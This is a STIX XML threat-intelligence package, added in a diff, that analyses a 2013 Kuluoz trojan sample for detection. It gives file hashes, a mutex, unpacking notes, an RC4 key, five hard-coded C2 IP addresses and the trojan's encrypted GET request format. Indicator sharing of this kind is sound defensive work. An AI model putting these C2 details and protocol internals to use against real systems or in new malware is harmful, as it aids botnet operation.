@@ -1,0 +1,243 @@
+<stix:STIX_Package xmlns:MutexObj="http://cybox.mitre.org/objects#MutexObject-2" xmlns:cyboxVocabs="http://cybox.mitre.org/default_vocabularies-2" xmlns:indicator="http://stix.mitre.org/Indicator-2" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:FileObj="http://cybox.mitre.org/objects#FileObject-2" xmlns:stixCommon="http://stix.mitre.org/common-1" xmlns:cyboxCommon="http://cybox.mitre.org/common-2" xmlns:marking="http://data-marking.mitre.org/Marking-1" xmlns:tlpMarking="http://data-marking.mitre.org/extensions/MarkingStructure#TLP-1" xmlns:stixVocabs="http://stix.mitre.org/default_vocabularies-1" xmlns:cybox="http://cybox.mitre.org/cybox-2" xmlns:stix="http://stix.mitre.org/stix-1" xmlns:CISCP="http://www.us-cert.gov/ciscp" xmlns:AddrObj="http://cybox.mitre.org/objects#AddressObject-2" id="CISCP:IB-13-10424" version="1.1.1" xsi:schemaLocation="http://cybox.mitre.org/objects#DomainNameObject-1 http://cybox.mitre.org/XMLSchema/objects/Domain_Name/1.0/Domain_Name_Object.xsd http://cybox.mitre.org/objects#PortObject-2 http://cybox.mitre.org/XMLSchema/objects/Port/2.1/Port_Object.xsd http://cybox.mitre.org/common-2 http://cybox.mitre.org/XMLSchema/common/2.1/cybox_common.xsd http://cybox.mitre.org/objects#WinRegistryKeyObject-2 http://cybox.mitre.org/XMLSchema/objects/Win_Registry_Key/2.1/Win_Registry_Key_Object.xsd http://stix.mitre.org/default_vocabularies-1 http://stix.mitre.org/XMLSchema/default_vocabularies/1.1.1/stix_default_vocabularies.xsd http://cybox.mitre.org/objects#FileObject-2 http://cybox.mitre.org/XMLSchema/objects/File/2.1/File_Object.xsd http://data-marking.mitre.org/Marking-1 http://stix.mitre.org/XMLSchema/data_marking/1.1.1/data_marking.xsd http://cybox.mitre.org/objects#SocketAddressObject-1 http://cybox.mitre.org/XMLSchema/objects/Socket_Address/1.1/Socket_Address_Object.xsd http://stix.mitre.org/common-1 http://stix.mitre.org/XMLSchema/common/1.1.1/stix_common.xsd http://data-marking.mitre.org/extensions/MarkingStructure#TLP-1 http://stix.mitre.org/XMLSchema/extensions/marking/tlp/1.1.1/tlp_marking.xsd http://stix.mitre.org/stix-1 http://stix.mitre.org/XMLSchema/core/1.1.1/stix_core.xsd http://cybox.mitre.org/objects#LinkObject-1 http://cybox.mitre.org/XMLSchema/objects/Link/1.1/Link_Object.xsd http://cybox.mitre.org/objects#AddressObject-2 http://cybox.mitre.org/XMLSchema/objects/Address/2.1/Address_Object.xsd http://cybox.mitre.org/default_vocabularies-2 http://cybox.mitre.org/XMLSchema/default_vocabularies/2.1/cybox_default_vocabularies.xsd http://cybox.mitre.org/objects#URIObject-2 http://cybox.mitre.org/XMLSchema/objects/URI/2.1/URI_Object.xsd http://stix.mitre.org/Indicator-2 http://stix.mitre.org/XMLSchema/indicator/2.1.1/indicator.xsd http://cybox.mitre.org/objects#EmailMessageObject-2 http://cybox.mitre.org/XMLSchema/objects/Email_Message/2.1/Email_Message_Object.xsd http://data-marking.mitre.org/extensions/MarkingStructure#Simple-1 http://stix.mitre.org/XMLSchema/extensions/marking/simple/1.1.1/simple_marking.xsd http://cybox.mitre.org/objects#MutexObject-2 http://cybox.mitre.org/XMLSchema/objects/Mutex/2.1/Mutex_Object.xsd http://cybox.mitre.org/objects#NetworkConnectionObject-2 http://cybox.mitre.org/XMLSchema/objects/Network_Connection/2.1/Network_Connection_Object.xsd http://us-cert.gov/ciscp http://www.us-cert.gov/sites/default/files/STIX_Namespace/ciscp_vocab_v1.1.1.xsd http://cybox.mitre.org/objects#HTTPSessionObject-2 http://cybox.mitre.org/XMLSchema/objects/HTTP_Session/2.1/HTTP_Session_Object.xsd http://cybox.mitre.org/cybox-2 http://cybox.mitre.org/XMLSchema/core/2.1/cybox_core.xsd">
+  <stix:STIX_Header>
+    <stix:Title>Analysis of Kuluoz trojan sample with five hard-coded C2 IP addresses</stix:Title>
+    <stix:Package_Intent xsi:type="stixVocabs:PackageIntentVocab-1.0">Indicators</stix:Package_Intent>
+    <stix:Description>On 11 July 2013, a sample of Kuluoz trojan/bot was submitted for analysis. Analysis revealed five hard coded command and control (C2) servers.
+
+This document incorporates data originally released as MAR-297606.</stix:Description>
+    <stix:Handling>
+      <marking:Marking>
+        <marking:Controlled_Structure>//node()</marking:Controlled_Structure>
+        <marking:Marking_Structure color="GREEN" xsi:type="tlpMarking:TLPMarkingStructureType"/>
+      </marking:Marking>
+    </stix:Handling>
+    <stix:Information_Source>
+      <stixCommon:Time>
+        <cyboxCommon:Produced_Time>2013-07-22T13:46:45Z</cyboxCommon:Produced_Time>
+      </stixCommon:Time>
+    </stix:Information_Source>
+  </stix:STIX_Header>
+  <stix:Indicators>
+    <stix:Indicator id="CISCP:indicator-dce0c3eb-f9f6-4287-bc9b-2d47bb97f6da" version="2.1.1" xsi:type="indicator:IndicatorType">
+      <indicator:Composite_Indicator_Expression operator="OR">
+        <indicator:Indicator idref="CISCP:indicator-406bc359-c79d-46a1-b28d-c87016ee030f"/>
+        <indicator:Indicator idref="CISCP:indicator-946d177f-18bb-4388-9f9a-0f65c7c6356b"/>
+        <indicator:Indicator idref="CISCP:indicator-e8dd7fc1-f971-418d-bf99-c42a5c489431"/>
+        <indicator:Indicator idref="CISCP:indicator-781672a3-1831-4595-8cc9-0a58e9ca3631"/>
+        <indicator:Indicator idref="CISCP:indicator-ad9d687d-2c73-4717-ab06-eb9284bd66bf"/>
+        <indicator:Indicator idref="CISCP:indicator-f0c014fe-bd03-4846-9d8a-29f3554a9189"/>
+      </indicator:Composite_Indicator_Expression>
+    </stix:Indicator>
+    <stix:Indicator id="CISCP:indicator-406bc359-c79d-46a1-b28d-c87016ee030f" version="2.1.1" xsi:type="indicator:IndicatorType">
+      <indicator:Type xsi:type="stixVocabs:IndicatorTypeVocab-1.1">Malware Artifacts</indicator:Type>
+      <indicator:Description>Antivirus Identifier:
+Kaspersky: Backdoor.Win32.Androm.abvb
+McAfee: RDN/Generic Downloader.x!hz
+Microsoft: TrojanDownloader:Win32/Kuluoz.B
+Symantec: Trojan.Fakeavlock
+TrendMicro TROJ_KULUOZ.MDK
+
+This file is protected by multiple layers of obfuscation. After a layer of the Ultimate Packer for eXecutables (UPX) is unwrapped, another layer of customized protection is revealed. Unpacking the second layer revealed the original entry point (OEP) at memory offset 0x408360.
+
+The Trojan spawns a new svchost.exe process and injects into it a blob of data containing a dynamic link library (DLL) and instructions to load the DLL.
+
+Under the "svchost.exe" process's context, the malware locates a 4&#8208;byte value, "0x3313548A", to get the location of the DLL and maps the DLL into the process's memory. Once the DLL is mapped, the malware executes the DLL's export function, "Work". The Trojan's malicious logic is implemented inside this export function.
+
+The Trojan uses a named mutex, "yUCnKCMb", to prevent concurrent executions.
+
+As a decoy to the user, the Trojan renders the text block below using the "notepad.exe" application.
+RECIPIENT: Mark Smith
+LOCATION OF YOUR PARCEL: Los Angeles
+STATUS OF YOUR ITEM: not delivered
+SERVICE: Standard Shipping
+ITEM NUMBER:U2342364242354&#8208;US
+INSURANCE: Yes
+
+Before it connects to its command and control (C2) servers, the Trojan calculates a unique identifier for the victim's computer. The unique
+identifier is a MD5 checksum of the user's SID, Operation System's installation date, and username. After the unique identifier is calculated,
+the Trojan selects the C2 from an array of five servers by using a uniform random number generator to select a number between one and five.
+
+The uniform random number generator implementation:
+.text:008C1990 push ebp
+.text:008C1991 mov ebp, esp
+.text:008C1993 mov eax, tick_count
+.text:008C1998 imul eax, 343FDh
+.text:008C199E add eax, 269EC3h
+.text:008C19A3 mov tick_count, eax
+.text:008C19A8 mov eax, tick_count
+.text:008C19AD shr eax, 10h
+.text:008C19B0 and eax, 7FFFh
+.text:008C19B5 pop ebp
+.text:008C19B6 retn
+
+The IP addresses and ports used for C2 communication are encrypted using the RC4 encryption algorithm. To decrypt the information,  "3DyZw6jCer" is used as the RC4 key.
+
+The encrypted C2s:
+0000000: 7246 9283 662c a7eb 19f2 f0b2 c1fa 4feb rF..f,........O.
+0000010: a1e3 b37a 74ce 5540 8e09 7fcb f856 ...zt.U@.....V
+
+Each 6&#8208;byte block is an IP Address and port number. Below is the conversion from binary to a readable string format after the IP addresses and ports have been decoded.
+64.76.19.241:8080
+95.173.186.184:8080
+84.41.105.41:8080
+85.214.114.16:8080
+62.113.200.95:8080
+
+To communicate with the C2 server, the Trojan creates a GET request consisting of hexadecimal characters. A sample GET request from a sandbox system is as follows:
+0x00000000 47 45 54 20 2f 44 37 41 42 44 30 31 32 46 32 30 GET/D7ABD012F20
+0x00000010 43 35 35 35 31 44 39 35 39 46 45 32 30 45 31 31 C5551D959FE20E11
+0x00000020 43 41 44 43 35 31 35 41 36 36 37 31 37 38 42 34 CADC515A667178B4
+0x00000030 36 33 36 41 44 44 46 38 30 32 43 31 34 33 32 36 636ADDF802C14326
+0x00000040 41 41 46 44 41 39 32 45 45 46 30 42 30 44 42 34 AAFDA92EEF0B0DB4
+0x00000050 36 35 32 36 37 34 45 37 33 36 45 38 43 46 38 42 652674E736E8CF8B
+0x00000060 30 44 46 37 37 39 45 34 39 30 44 39 39 35 35 37 0DF779E490D99557
+0x00000070 37 37 31 34 45 38 38 44 44 34 42 38 34 45 45 36 7714E88DD4B84EE6
+0x00000080 45 41 46 41 33 45 39 30 32 43 33 39 33 46 32 46 EAFA3E902C393F2F
+0x00000090 45 35 35 44 41 34 33 38 33 45 41 42 42 36 34 33 E55DA4383EABB643
+0x000000a0 38 41 33 20 48 54 54 50 2f 31 2e 31 0d 0a 55 73 8A3HTTP/1.1..Us
+0x000000b0 65 72 2d 41 67 65 6e 74 3a 20 4d 6f 7a 69 6c 6c er&#8208;Agent:Mozill
+0x000000c0 61 2f 35 2e 30 20 28 57 69 6e 64 6f 77 73 3b 20 a/5.0 (Windows;
+0x000000d0 55 3b 20 4d 53 49 45 20 39 2e 30 3b 20 57 69 6e U; MSIE 9.0;Win
+0x000000e0 64 6f 77 73 20 4e 54 20 39 2e 30 3b 20 65 6e 2d dows NT 9.0;en&#8208;
+0x000000f0 55 53 29 0d 0a 48 6f 73 74 3a 20 38 35 2e 32 31 US)..Host:85.21
+0x00000100 34 2e 31 31 34 2e 31 36 3a 38 30 38 30 0d 0a 0d 4.114.16:8080...
+0x00000110 0a                                              .
+
+The string of hexadecimal characters is an encrypted version of the GET request. To generate the hexadecimal string, the Trojan uses the first 8 characters of the unique identifier as the key and encrypts the request using the RC4 algorithm. The Trojan then converts the encrypted data into hexadecimal characters, prefixes it with the encryption key, and sends the request to the C2 server.
+
+Using the key "D7ABD012", the GET request is decrypted into
+"/index.php?r=gate&amp;id=D7ABD0122F569A1245F13A6DB421E26C&amp;group=1107rcm&amp;debug=0".
+
+The Trojan is capable of installing additional binaries onto the victim system, updating itself, and updating its C2 server list.</indicator:Description>
+      <indicator:Observable id="CISCP:Observable-813da0a4-978d-4908-aa7e-389d94bdb77b">
+        <cybox:Object id="CISCP:Object-82440ef9-1488-4643-9bf4-b40e85935820">
+          <cybox:Properties xsi:type="FileObj:FileObjectType">
+            <FileObj:File_Name condition="Equals">rlhbwapo.exe</FileObj:File_Name>
+            <FileObj:Size_In_Bytes condition="Equals">32768</FileObj:Size_In_Bytes>
+            <FileObj:Hashes>
+              <cyboxCommon:Hash>
+                <cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">MD5</cyboxCommon:Type>
+                <cyboxCommon:Simple_Hash_Value condition="Equals">5783478b335e433fb2a6453e013cfd2e</cyboxCommon:Simple_Hash_Value>
+              </cyboxCommon:Hash>
+              <cyboxCommon:Hash>
+                <cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">SHA1</cyboxCommon:Type>
+                <cyboxCommon:Simple_Hash_Value condition="Equals">0def84427fa601476cf99a110579ee3bda271ce0</cyboxCommon:Simple_Hash_Value>
+              </cyboxCommon:Hash>
+              <cyboxCommon:Hash>
+                <cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">SSDEEP</cyboxCommon:Type>
+                <cyboxCommon:Fuzzy_Hash_Value condition="Equals">384:xChpt3nmuygZYNk0QhOUkdYZa62Iz/WmQrbatOCPcrK+GzFO0riKZO51tyXhVspv:x6Lyg0kD1+mQvathcrEzA0GoO51e</cyboxCommon:Fuzzy_Hash_Value>
+              </cyboxCommon:Hash>
+            </FileObj:Hashes>
+          </cybox:Properties>
+          <cybox:Related_Objects>
+            <cybox:Related_Object id="CISCP:Object-4a61f01a-af6c-4206-90d8-e197db1817b7">
+              <cybox:Properties xsi:type="MutexObj:MutexObjectType">
+                <MutexObj:Name condition="Equals">yUCnKCMb</MutexObj:Name>
+              </cybox:Properties>
+              <cybox:Relationship xsi:type="cyboxVocabs:ObjectRelationshipVocab-1.1">Contains</cybox:Relationship>
+            </cybox:Related_Object>
+          </cybox:Related_Objects>
+        </cybox:Object>
+      </indicator:Observable>
+      <indicator:Kill_Chain_Phases>
+        <stixCommon:Kill_Chain_Phase kill_chain_id="stix:KillChain-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" kill_chain_name="LM Cyber Kill Chain" name="Installation" ordinality="5" phase_id="stix:KillChainPhase-e1e4e3f7-be3b-4b39-b80a-a593cfd99a4f"/>
+      </indicator:Kill_Chain_Phases>
+      <indicator:Sightings sightings_count="1">
+        <indicator:Sighting timestamp="2013-07-11T00:00:00"/>
+      </indicator:Sightings>
+    </stix:Indicator>
+    <stix:Indicator id="CISCP:indicator-946d177f-18bb-4388-9f9a-0f65c7c6356b" version="2.1.1" xsi:type="indicator:IndicatorType">
+      <indicator:Description>This IP address it hard-coded into the malware. A GET request is sent to the IP over port 8080.</indicator:Description>
+      <indicator:Observable id="CISCP:Observable-a5d7feb3-4358-4b65-b5ed-1523d0eddb0f">
+        <cybox:Object id="CISCP:Object-33fc2b46-5a16-4e6c-a033-6570a3466d35">
+          <cybox:Properties category="ipv4-addr" xsi:type="AddrObj:AddressObjectType">
+            <AddrObj:Address_Value condition="Equals">64.76.19.241</AddrObj:Address_Value>
+          </cybox:Properties>
+        </cybox:Object>
+      </indicator:Observable>
+      <indicator:Kill_Chain_Phases>
+        <stixCommon:Kill_Chain_Phase kill_chain_id="stix:KillChain-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" kill_chain_name="LM Cyber Kill Chain" name="Command and Control" ordinality="6" phase_id="stix:KillChainPhase-d6dc32b9-2538-4951-8733-3cb9ef1daae2"/>
+      </indicator:Kill_Chain_Phases>
+      <indicator:Sightings sightings_count="1">
+        <indicator:Sighting timestamp="2013-07-11T00:00:00"/>
+      </indicator:Sightings>
+    </stix:Indicator>
+    <stix:Indicator id="CISCP:indicator-e8dd7fc1-f971-418d-bf99-c42a5c489431" version="2.1.1" xsi:type="indicator:IndicatorType">
+      <indicator:Description>This IP address it hard-coded into the malware. A GET request is sent to the IP over port 8080.</indicator:Description>
+      <indicator:Observable id="CISCP:Observable-c55e42db-25cf-44ed-9bf3-3475ce79a0d8">
+        <cybox:Object id="CISCP:Object-b99ed103-f030-4861-972e-f9fdd477e303">
+          <cybox:Properties category="ipv4-addr" xsi:type="AddrObj:AddressObjectType">
+            <AddrObj:Address_Value condition="Equals">95.173.186.184</AddrObj:Address_Value>
+          </cybox:Properties>
+        </cybox:Object>
+      </indicator:Observable>
+      <indicator:Kill_Chain_Phases>
+        <stixCommon:Kill_Chain_Phase kill_chain_id="stix:KillChain-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" kill_chain_name="LM Cyber Kill Chain" name="Command and Control" ordinality="6" phase_id="stix:KillChainPhase-d6dc32b9-2538-4951-8733-3cb9ef1daae2"/>
+      </indicator:Kill_Chain_Phases>
+      <indicator:Sightings sightings_count="1">
+        <indicator:Sighting timestamp="2013-07-11T00:00:00"/>
+      </indicator:Sightings>
+    </stix:Indicator>
+    <stix:Indicator id="CISCP:indicator-781672a3-1831-4595-8cc9-0a58e9ca3631" version="2.1.1" xsi:type="indicator:IndicatorType">
+      <indicator:Description>This IP address it hard-coded into the malware. A GET request is sent to the IP over port 8080.</indicator:Description>
+      <indicator:Observable id="CISCP:Observable-8b6b52ba-b373-4f2e-978e-6a6597aa552d">
+        <cybox:Object id="CISCP:Object-729edcff-4e31-4350-bcc0-57281bae98f7">
+          <cybox:Properties category="ipv4-addr" xsi:type="AddrObj:AddressObjectType">
+            <AddrObj:Address_Value condition="Equals">84.41.105.41</AddrObj:Address_Value>
+          </cybox:Properties>
+        </cybox:Object>
+      </indicator:Observable>
+      <indicator:Kill_Chain_Phases>
+        <stixCommon:Kill_Chain_Phase kill_chain_id="stix:KillChain-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" kill_chain_name="LM Cyber Kill Chain" name="Command and Control" ordinality="6" phase_id="stix:KillChainPhase-d6dc32b9-2538-4951-8733-3cb9ef1daae2"/>
+      </indicator:Kill_Chain_Phases>
+      <indicator:Sightings sightings_count="1">
+        <indicator:Sighting timestamp="2013-07-11T00:00:00"/>
+      </indicator:Sightings>
+    </stix:Indicator>
+    <stix:Indicator id="CISCP:indicator-ad9d687d-2c73-4717-ab06-eb9284bd66bf" version="2.1.1" xsi:type="indicator:IndicatorType">
+      <indicator:Description>This IP address it hard-coded into the malware. A GET request is sent to the IP over port 8080.</indicator:Description>
+      <indicator:Observable id="CISCP:Observable-faf8695c-0b62-468e-b798-fd5bfc48ae09">
+        <cybox:Object id="CISCP:Object-8ac5c504-32c4-4b3c-a7a0-bac37a6b20c5">
+          <cybox:Properties category="ipv4-addr" xsi:type="AddrObj:AddressObjectType">
+            <AddrObj:Address_Value condition="Equals">85.214.114.16</AddrObj:Address_Value>
+          </cybox:Properties>
+        </cybox:Object>
+      </indicator:Observable>
+      <indicator:Kill_Chain_Phases>
+        <stixCommon:Kill_Chain_Phase kill_chain_id="stix:KillChain-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" kill_chain_name="LM Cyber Kill Chain" name="Command and Control" ordinality="6" phase_id="stix:KillChainPhase-d6dc32b9-2538-4951-8733-3cb9ef1daae2"/>
+      </indicator:Kill_Chain_Phases>
+      <indicator:Sightings sightings_count="1">
+        <indicator:Sighting timestamp="2013-07-11T00:00:00"/>
+      </indicator:Sightings>
+    </stix:Indicator>
+    <stix:Indicator id="CISCP:indicator-f0c014fe-bd03-4846-9d8a-29f3554a9189" version="2.1.1" xsi:type="indicator:IndicatorType">
+      <indicator:Description>This IP address it hard-coded into the malware. A GET request is sent to the IP over port 8080.</indicator:Description>
+      <indicator:Observable id="CISCP:Observable-548f3eaf-f4ea-4963-a842-05fe957ce63b">
+        <cybox:Object id="CISCP:Object-9d4c5d74-35bd-44da-86a1-76f25cf1f54d">
+          <cybox:Properties category="ipv4-addr" xsi:type="AddrObj:AddressObjectType">
+            <AddrObj:Address_Value condition="Equals">62.113.200.95</AddrObj:Address_Value>
+          </cybox:Properties>
+        </cybox:Object>
+      </indicator:Observable>
+      <indicator:Kill_Chain_Phases>
+        <stixCommon:Kill_Chain_Phase kill_chain_id="stix:KillChain-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" kill_chain_name="LM Cyber Kill Chain" name="Command and Control" ordinality="6" phase_id="stix:KillChainPhase-d6dc32b9-2538-4951-8733-3cb9ef1daae2"/>
+      </indicator:Kill_Chain_Phases>
+      <indicator:Sightings sightings_count="1">
+        <indicator:Sighting timestamp="2013-07-11T00:00:00"/>
+      </indicator:Sightings>
+    </stix:Indicator>
+  </stix:Indicators>
+  <stix:TTPs>
+    <stix:Kill_Chains>
+      <stixCommon:Kill_Chain definer="LMCO" id="stix:KillChain-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" name="LM Cyber Kill Chain" number_of_phases="7" reference="http://www.lockheedmartin.com/content/dam/lockheed/data/corporate/documents/LM-White-Paper-Intel-Driven-Defense.pdf">
+        <stixCommon:Kill_Chain_Phase name="Reconnaissance" ordinality="1" phase_id="stix:KillChainPhase-af1016d6-a744-4ed7-ac91-00fe2272185a"/>
+        <stixCommon:Kill_Chain_Phase name="Weaponization" ordinality="2" phase_id="stix:KillChainPhase-445b4827-3cca-42bd-8421-f2e947133c16"/>
+        <stixCommon:Kill_Chain_Phase name="Delivery" ordinality="3" phase_id="stix:KillChainPhase-79a0e041-9d5f-49bb-ada4-8322622b162d"/>
+        <stixCommon:Kill_Chain_Phase name="Exploitation" ordinality="4" phase_id="stix:KillChainPhase-f706e4e7-53d8-44ef-967f-81535c9db7d0"/>
+        <stixCommon:Kill_Chain_Phase name="Installation" ordinality="5" phase_id="stix:KillChainPhase-e1e4e3f7-be3b-4b39-b80a-a593cfd99a4f"/>
+        <stixCommon:Kill_Chain_Phase name="Command and Control" ordinality="6" phase_id="stix:KillChainPhase-d6dc32b9-2538-4951-8733-3cb9ef1daae2"/>
+        <stixCommon:Kill_Chain_Phase name="Actions on Objectives" ordinality="7" phase_id="stix:KillChainPhase-786ca8f9-2d9a-4213-b38e-399af4a2e5d6"/>
+      </stixCommon:Kill_Chain>
+    </stix:Kill_Chains>
+  </stix:TTPs>
+</stix:STIX_Package>
